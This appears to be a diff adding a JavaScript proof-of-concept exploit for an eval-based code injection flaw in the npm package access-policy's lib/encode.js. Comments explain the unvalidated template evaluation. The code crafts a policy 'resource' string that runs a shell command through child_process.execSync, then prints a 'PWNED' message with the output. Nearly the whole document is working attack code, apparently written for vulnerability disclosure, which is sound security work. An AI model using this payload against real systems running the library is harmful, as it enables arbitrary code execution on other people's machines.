@@ -1,0 +1,39 @@
+```javascript
+// Vulnerability: eval-based code injection in access-policy's lib/encode.js
+//
+// encode.js resolves "${...}" template placeholders inside policy statements by
+// running:  eval(`${JSON.stringify(statements).replace(/\$\{/g, '${data.')}`)
+// It never validates that the placeholder body is a safe property path, so any
+// statement whose `resource` field contains a template expression gets
+// evaluated as live JavaScript with the module's own scope (including
+// `require`) reachable through the scope chain. A `resource` string sourced
+// from anything less than fully trusted policy authors yields arbitrary code
+// execution.
+
+const accessPolicy = require("access-policy");
+
+// The obfuscated build renamed encode.js's local "data" parameter, so the
+// forced "${data." prefix resolves through the scope chain to this global
+// instead — any object works, since it's only used as a syntactic anchor.
+global.data = {};
+
+const statements = [{
+  effect: "allow",
+  action: "*",
+  resource: [
+    "${data,require('child_process').execSync('id > /tmp/access-policy-pwned.txt')}"
+  ]
+}];
+
+const request = { Action: "GET", Resource: "/whatever" };
+
+try {
+  accessPolicy.resource(statements, request);
+} catch (e) {
+  // The mangled JSON produced after eval may fail to re-parse downstream;
+  // that's irrelevant — the injected code has already executed by then.
+}
+
+console.log("PWNED, command output:");
+console.log(require("fs").readFileSync("/tmp/access-policy-pwned.txt", "utf8"));
+```
